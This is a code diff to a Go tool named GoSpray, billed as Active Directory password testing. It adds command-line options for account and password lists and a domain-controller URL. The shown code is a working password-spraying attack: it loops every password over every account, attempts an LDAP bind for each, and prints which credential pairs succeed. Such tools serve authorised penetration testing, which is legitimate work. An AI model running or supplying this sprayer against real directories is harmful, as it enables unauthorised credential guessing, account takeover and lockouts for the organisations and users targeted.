@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	"flag"
 	"fmt"
 	"log"
 	"os"
@@ -10,6 +11,8 @@ import (
 )
 
 type configuration struct {
+	accountsfile     string
+	passwordfile     string
 	domainController string
 	verbose          bool
 }
@@ -20,7 +23,7 @@ type configuration struct {
 func readFile(filename string) []string {
 	file, err := os.Open(filename)
 	if err != nil {
-		log.Fatalf("Failed to open file (%s): %s", filename, err)
+		log.Fatal(err)
 	}
 	defer file.Close()
 
@@ -37,40 +40,56 @@ func readFile(filename string) []string {
 }
 
 /////////////////////////////////////////////////////////////////
-/// GoSpray
+/// Main
 /////////////////////////////////////////////////////////////////
 func main() {
-	fmt.Println("GoSpray - Active Directory Password Testing")
+
+	fmt.Println("*******************************************************")
+	fmt.Println("*** GoSpray - Active Directory Password Testing     ***")
+	fmt.Println("*** Be aware of account lockout policies            ***")
+	fmt.Println("*** Use at your own risk                            ***")
+	fmt.Println("*** WUNDERWUZZI, July 2019, MIT License             ***")
+	fmt.Println("*******************************************************")
 	fmt.Println()
 
 	//Setup the basic configuration
 	config := configuration{}
-	config.domainController = "ldaps://<yourdomain>.<corp>.<com>"
-	config.verbose = true
+	flag.StringVar(&config.accountsfile, "accounts", "accounts.list", "Filename of the accounts to test. One account name per line.")
+	flag.StringVar(&config.passwordfile, "passwords", "passwords.list", "Password file, one password per line.")
+	flag.StringVar(&config.domainController, "dc", "ldaps://<yourdomain>.<corp>.<com>", "URL to your LDAP Server")
+	flag.BoolVar(&config.verbose, "verbose", true, "Verbose errors")
+	flag.Parse()
 
-	passwords := readFile("passwords.list")
-	users := readFile("users.list")
+	fmt.Println("Configuration:")
+	fmt.Println("==============")
+	fmt.Println("Accounts File    : " + config.accountsfile)
+	fmt.Println("Passwords File   : " + config.passwordfile)
+	fmt.Println("Domain Controller: " + config.domainController)
+	//fmt.Println("Verbose Output:    " + config.verbose)
+	fmt.Println()
+	log.Println("Reading Input Files.")
+	passwords := readFile(config.passwordfile)
+	accounts := readFile(config.accountsfile)
 
 	log.Println("Starting.")
-
 	for _, password := range passwords {
-		for _, username := range users {
-			validate(config, username, password)
+		for _, account := range accounts {
+			validate(config, account, password)
 		}
 	}
 	log.Printf("Done.")
 }
 
-func validate(config configuration, username string, password string) {
+func validate(config configuration, accountname string, password string) {
 	connection, err := ldap.DialURL(config.domainController)
 	if err != nil {
-		log.Fatalf("Error connecting to domain (%s): %s", config.domainController, err)
+		log.Fatalf("Error connecting to domain: %s", err)
 	}
 	defer connection.Close()
 
 	//Validate the credentials
-	fmt.Printf("%s::%s::", username, password)
-	err = connection.Bind(username, password)
+	fmt.Printf("%s::%s::", accountname, password)
+	err = connection.Bind(accountname, password)
 	if err != nil {
 		fmt.Println("Failed")
 		if config.verbose {
